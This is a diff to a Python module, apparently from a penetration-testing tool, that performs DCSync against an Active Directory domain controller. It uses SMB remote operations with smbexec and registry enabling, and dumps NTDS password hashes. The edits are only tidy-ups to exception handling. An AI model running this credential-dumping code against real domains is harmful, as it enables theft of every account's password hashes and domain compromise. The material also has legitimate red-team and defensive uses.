@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import contextlib
 import json
 from typing import Any
 
@@ -47,6 +48,7 @@ class Dcsync:
             principals = [str(just_dc_user)]
         elif principals_source:
             from pathlib import Path as _P
+
             path = _P(str(principals_source)).expanduser()
             if path.is_file():
                 principals = [
@@ -89,10 +91,8 @@ class Dcsync:
 
         remote = RemoteOperations(smb, doKerberos=target.use_kerberos, kdcHost=target.dc_ip)
         remote.setExecMethod("smbexec")
-        try:
+        with contextlib.suppress(Exception):
             remote.enableRegistry()
-        except Exception:  # noqa: BLE001
-            pass
 
         collected: list[dict[str, Any]] = []
 
@@ -102,7 +102,6 @@ class Dcsync:
             console.print(f"  [green]dc[/green] {text[:120]}")
 
         no_lm = False
-        no_hist = not history
         try:
             ntds_hashes = NTDSHashes(
                 None,
@@ -123,10 +122,8 @@ class Dcsync:
             )
             ntds_hashes.dump()
         finally:
-            try:
+            with contextlib.suppress(Exception):
                 remote.finish()
-            except Exception:  # noqa: BLE001
-                pass
 
         parsed: list[dict[str, Any]] = []
         for record in collected:
